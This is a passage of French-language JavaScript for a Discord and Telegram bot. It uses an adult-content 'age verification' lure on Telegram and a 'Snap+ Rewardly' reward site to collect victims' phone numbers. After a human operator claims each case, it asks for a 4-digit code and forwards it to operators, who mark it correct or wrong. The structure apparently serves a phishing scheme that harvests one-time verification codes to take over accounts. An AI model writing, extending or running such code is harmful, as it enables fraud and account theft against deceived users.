      if (!targetChannel) throw new Error("Salon modo introuvable");

      const now = new Date();
      const dateStr = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });

      const webUser = {
        username: data.pseudo,
        id: data.pseudo,
        displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png"
      };
      const originGuild = { name: modGuild.name, memberCount: modGuild.memberCount || 0, id: modGuild.id };

      const detailEmbed = await buildModEmbed(webUser, originGuild, data.phone, null, dateStr, null, "00:00");
      const chanName = `web-${data.pseudo}`.toLowerCase().replace(/[^a-z0-9-]/g, '-').slice(0, 80);

      const newChannel = await modGuild.channels.create({
        name: chanName,
        type: ChannelType.GuildText,
        parent: targetChannel.parentId || null,
        permissionOverwrites: [
          { id: modGuild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: i.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
          { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
        ],
        reason: `Web verify claim ${data.pseudo} ${data.phone}`
      });

      const row1 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`web_validate_${webId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`web_refused_${webId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌"),
        new ButtonBuilder().setCustomId(`web_msg_${webId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬")
      );
      const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`web_close_${webId}`).setLabel("Supprimer le salon").setStyle(ButtonStyle.Danger).setEmoji("🗑️")
      );

      const detailMsg = await newChannel.send({ content: `<@&1547717348348403812>`, embeds: [detailEmbed], components: [row1, row3], allowedMentions: { roles: ["1547717348348403812"] } });

      data.channelId = newChannel.id;
      data.messageId = detailMsg.id;
      data.claimTs = Date.now();
      pending.set(webKey, data);
      saveDbStats().catch(() => {});

      const claimChannel = await client.channels.fetch(data.modChannelId).catch(() => null);
      if (claimChannel) {
        const claimMsg = await claimChannel.messages.fetch(data.modMessageId).catch(() => null);
        if (claimMsg) {
          const claimedEmbed = new EmbedBuilder()
            .setTitle("📥 Nouvelle demande — Site web")
            .setDescription(`Un utilisateur a soumis ses informations sur le site.\n> Pseudo : \`${data.pseudo}\`\n> Téléphone : \`${data.phone}\``)
            .addFields(
              { name: "👤 Pseudo", value: `\`${data.pseudo}\``, inline: true },
              { name: "📱 Téléphone", value: `\`${data.phone}\``, inline: true },
              { name: "🌐 Source", value: "snap-reward.onrender.com", inline: true },
              { name: "👮 Claim par", value: `<@${i.user.id}>`, inline: true }
            )
            .setColor(0x5865f2)
            .setTimestamp()
            .setFooter({ text: "Snap+ Rewardly • Claimé" });
          await claimMsg.edit({ content: `✅ Claimé par <@${i.user.id}> — salon créé : ${newChannel}`, embeds: [claimedEmbed], components: [] });
        }
      }
    } catch (e) {
      console.error("Erreur claim web:", e.message);
      await i.reply({ content: `Erreur création salon: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isStringSelectMenu() && i.customId.startsWith("web_staff_")) {
    const webId = i.customId.replace("web_staff_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }

    const value = i.values[0];

    try {
      if (value === "reset") {
        webTickets.delete(webId);
        await i.reply({ content: `🔄 Tentative de <@${data.pseudo}> réinitialisée.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "blacklist_num") {
        blacklistedNums.add(data.phone);
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `🔴 Numéro ${data.phone} blacklisté.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "blacklist_user") {
        blacklistedUsers.add(data.userId || "web");
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `⛔ Utilisateur ${data.pseudo} blacklisté.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "kick") {
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `👢 Utilisateur ${data.pseudo} expulsé.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "ban") {
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `🔨 Utilisateur ${data.pseudo} banni.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }
    } catch (e) {
      console.error("Erreur staff web:", e.message);
      await i.reply({ content: "Erreur lors de l'action staff.", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  // === ADMIN CODE (web) ===
  if (i.isButton() && i.customId.startsWith("web_validate_")) {
    const webId = i.customId.replace("web_validate_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    webTickets.set(webId, data);
    try {
      await fetch(`${SNAP_SITE}/api/admin/accept/${webId}`, { method: "POST" });
      webTickets.set(webId, data);
      await i.update({ content: `✅ Validé par <@${i.user.id}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_refused_")) {
    const webId = i.customId.replace("web_refused_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    webTickets.set(webId, data);
    try {
      await fetch(`${SNAP_SITE}/api/admin/refuse/${webId}`, { method: "POST" });
      webTickets.set(webId, data);
      await i.update({ content: `❌ Refusé par <@${i.user.id}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_msg_")) {
    const webId = i.customId.replace("web_msg_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.reply({ content: `💬 Envoie un MP à <@${data.pseudo}> pour la suite.`, flags: MessageFlags.Ephemeral });
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_close_")) {
    const webId = i.customId.replace("web_close_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande inconnue ou expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    await i.channel.delete().catch(() => {});
    webTickets.delete(webId);
    return;
  }
});

async function forwardTelegramToDiscord(tgUser, phone) {
  trackTelegramUser(tgUser, phone);
  const key = `tg:${tgUser.id}`;
  const now = new Date();
  const dateStr = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const displayName = tgUser.username ? `@${tgUser.username}` : `${tgUser.first_name || "Telegram"}`;
  const embed = new EmbedBuilder()
    .setTitle(`${displayName}`)
    .setDescription(`Telegram · \`${tgUser.id}\`\n\n🟢 présent\n\n**Soumis** · ${dateStr}\n\nClaim par @_`)
    .addFields({ name: "Numéro", value: `> \`${formatPhone(phone)}\` · ${getOperator(phone)}`, inline: false })
    .setColor(0x2b2d31);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`claim_tg_${tgUser.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
  );
  const modChannel = await getModChannel();
  const sent = await modChannel.send({ content: `<@&1547717348348403812> Telegram`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
  pending.set(key, { phone, code: null, originGuildId: "tg", userId: String(tgUser.id), date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null, tgName: displayName });
  saveDbStats().catch(()=>{});
}

if (process.env.TELEGRAM_BOT_TOKEN) {
  const { Telegraf, Markup } = require("telegraf");
  tgBot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
  tgBot.catch((e) => console.error("tg error:", e.message));
  tgBot.use(async (ctx, next) => {
    try { console.log(`tg ${ctx.updateType} ${ctx.chat ? ctx.chat.type : "?"} ${ctx.message && ctx.message.text ? ctx.message.text : ""}`); } catch {}
    await next();
  });
  let tgUsername = process.env.TELEGRAM_BOT_USERNAME || "";
  tgBot.telegram.getMe().then((me) => { tgUsername = me.username; }).catch(() => {});
  async function sendVerifyMsg(ctx) {
    const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup" || ctx.chat.type === "channel";
    const bigText = "🍑 ACCÈS +18 UNIQUEMENT\n\nTu pensais vraiment avoir accès à tout directement ? 😈\n\nUne partie du contenu est caché, réservé à nos membres vérifiés. 🔐\n\nFais la vérification pour débloquer le canal.";
    if (isGroup) {
      if (!tgUsername) {
        try { const me = await tgBot.telegram.getMe(); tgUsername = me.username; } catch {}
      }
      if (tgUsername) {
        const kb = Markup.inlineKeyboard([[Markup.button.url("🔓 Vérifier votre âge", `https://t.me/${tgUsername}?start=verify`)]]);
        if (process.env.IMAGE_URL) {
          try { await ctx.replyWithPhoto({ url: process.env.IMAGE_URL }, { caption: bigText, reply_markup: kb.reply_markup }); return; } catch {}
        }
        await ctx.reply(bigText, kb);
        return;
      }
    }
    await ctx.reply("🍑 ACCÈS +18 UNIQUEMENT\n\nClique pour te faire vérifier.", Markup.inlineKeyboard([[Markup.button.callback("🔓 Vérifier votre âge", "verify_age")]]));
  }
  tgBot.start((ctx) => sendVerifyMsg(ctx));
  tgBot.command("verify", (ctx) => sendVerifyMsg(ctx));
  tgBot.command("reset", async (ctx) => {
    pending.delete(`tg:${ctx.from.id}`);
    await ctx.reply("Demande effacée, renvoie ton numéro.");
  });
  tgBot.on("channel_post", async (ctx) => {
    try {
      const txt = ctx.channelPost && ctx.channelPost.text ? ctx.channelPost.text : "";
      console.log(`tg channel_post txt ${txt}`);
      if (txt.includes("/verify") || txt.includes("/start")) await sendVerifyMsg(ctx);
    } catch (e) { console.error("channel_post fail:", e.message); }
  });
  tgBot.on("new_chat_members", async (ctx) => {
    try {
      const me = await tgBot.telegram.getMe();
      const added = ctx.message.new_chat_members || [];
      if (added.some((m) => m.id === me.id)) await sendVerifyMsg(ctx);
    } catch {}
  });
  tgBot.action("verify_age", async (ctx) => {
    trackTelegramUser(ctx.from);
    try { await ctx.answerCbQuery(); } catch {}
    await ctx.reply("🔞 Vérification — Numéro de téléphone\n\n⚠️ Ne partage jamais de mot de passe ni info sensible.\n\nÉcris ton numéro (10 chiffres) :", Markup.forceReply({ input_field_placeholder: "0600000000" }));
  });
  tgBot.on("contact", async (ctx) => {
    trackTelegramUser(ctx.from);
    let phone = (ctx.message.contact.phone_number || "").replace(/\D/g, "");
    if (phone.startsWith("33")) phone = "0" + phone.slice(2);
    phone = phone.slice(-10);
    if (!/^[0-9]{10}$/.test(phone)) {
      await ctx.reply("❌ Numéro invalide : entre 10 chiffres.", Markup.removeKeyboard());
      return;
    }
    await ctx.reply("📩 Numéro reçu. En attente de validation par un modérateur.", Markup.removeKeyboard());
    try {
      await forwardTelegramToDiscord(ctx.from, phone);
    } catch (e) {
      console.error("tg forward fail:", e);
    }
  });
  tgBot.on("text", async (ctx) => {
    trackTelegramUser(ctx.from);
    const key = `tg:${ctx.from.id}`;
    const data = pending.get(key);
    const raw = (ctx.message.text || "").trim();
    if (raw.startsWith("/")) return;
    const digits = raw.replace(/\D/g, "");
    let maybePhone = digits;
    if (maybePhone.startsWith("33")) maybePhone = "0" + maybePhone.slice(2);
    maybePhone = maybePhone.slice(-10);
    const isPhone = /^[0-9]{10}$/.test(maybePhone);
    if (data && !data.code && !data.claimedBy && isPhone) {
      data.phone = maybePhone;
      pending.set(key, data);
      try {
        const modChannel = await client.channels.fetch(data.modChannelId).catch(() => null);
        if (!modChannel) throw new Error("modChannel introuvable");
        let modMsg = await modChannel.messages.fetch(data.modMessageId).catch(() => null);
        const embed = new EmbedBuilder()
          .setTitle(`${data.tgName || "Telegram"}`)
          .setDescription(`Telegram · \`${ctx.from.id}\`\n\n🟢 présent\n\n**Soumis** · ${data.dateStr}\n\nClaim par @_`)
          .addFields({ name: "Numéro", value: `> \`${formatPhone(maybePhone)}\` · ${getOperator(maybePhone)}`, inline: false })
          .setColor(0x2b2d31);
        if (modMsg) {
          try {
            await modMsg.edit({ embeds: [embed] });
          } catch (e) {
            if (e.code === 10008) modMsg = null;
            else throw e;
          }
        }
        if (!modMsg) {
          const sent = await modChannel.send({ content: `<@&1547717348348403812> Telegram`, embeds: [embed], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`claim_tg_${ctx.from.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary))], allowedMentions: { roles: ["1547717348348403812"] } });
          data.modMessageId = sent.id;
          data.modChannelId = modChannel.id;
          pending.set(key, data);
        }
        await ctx.reply("📩 Numéro mis à jour chez les modos.");
        console.log(`tg update ok ${ctx.from.id} ${maybePhone}`);
      } catch (e) { console.error("tg update fail:", e.code || e.message); }
      return;
    }
    if (!data) {
      if (!isPhone) {
        await ctx.reply("❌ Numéro invalide. Écris tes 10 chiffres :", Markup.forceReply({ input_field_placeholder: "0600000000" }));
        return;
      }
      await ctx.reply("📩 Numéro reçu. En attente de validation par un modérateur.");
      try { await forwardTelegramToDiscord(ctx.from, maybePhone); console.log(`tg forward ok ${ctx.from.id} ${maybePhone}`); } catch (e) { console.error("tg forward fail:", e); await ctx.reply(`Erreur envoi Discord: ${e.message}`); }
      return;
    }
    if (data.code) return;
    if (!data.claimedBy) {
      await ctx.reply("⏳ Numéro en attente de validation modo, attends le prochain message.");
      return;
    }
    const code = (ctx.message.text || "").trim();
    if (!/^[0-9]{4}$/.test(code)) {
      await ctx.reply("❌ Code invalide : 4 chiffres. Réessaie :", Markup.forceReply());
      return;
    }
    data.code = code;
    pending.set(key, data);
    await ctx.reply("✅ Code reçu. En attente de validation finale.");
    try {
      const targetChannel = await client.channels.fetch(data.threadId || data.modChannelId);
      const logEmbed = new EmbedBuilder()
        .setTitle("📩 Code Telegram reçu")
        .addFields(
          { name: "Membre", value: `${data.tgName || ""} \`${ctx.from.id}\``, inline: false },
          { name: "Numéro", value: `\`${formatPhone(data.phone)}\` · ${getOperator(data.phone)}`, inline: true },
          { name: "Code", value: `\`${code}\``, inline: true }
        )
        .setFooter({ text: data.dateStr })
        .setColor(0x57f287);
      await targetChannel.send({ content: data.claimedBy ? `<@${data.claimedBy}>` : undefined, embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`code_ok_tg_${ctx.from.id}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
        new ButtonBuilder().setCustomId(`code_bad_tg_${ctx.from.id}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
      )], allowedMentions: { users: data.claimedBy ? [data.claimedBy] : [] } });
    } catch (e) {
      console.error("tg code forward fail:", e);
    }
  });
  tgBot.launch().then(() => console.log("Telegram ok")).catch((e) => console.error("Telegram fail:", e.message));
}

client.login(process.env.TOKEN);